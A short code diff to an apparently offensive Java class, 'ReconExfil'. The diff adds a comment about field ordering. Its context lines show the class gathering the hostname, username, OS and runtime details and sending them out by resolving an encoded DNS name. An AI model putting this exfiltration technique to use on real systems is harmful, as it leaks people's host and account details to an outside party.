@@ -80,6 +80,11 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         String runtimeInfo = getRuntimeInfo(javaProps);
         String uniqueId = getUniqueId();
 
+        /*
+         * Fields (other than uniqueId) may be re-arranged in order of priority, but ReconExfilDecoder naively assumes
+         * a certain order for its labels.
+         * The last field(s) may be automatically excluded if they don't fit into the domain name.
+         */
         String fullExfilDnsName = generateEncodedDomainName(uniqueId, hostname, username, osInfo, runtimeInfo);
         resolve(fullExfilDnsName);
     }
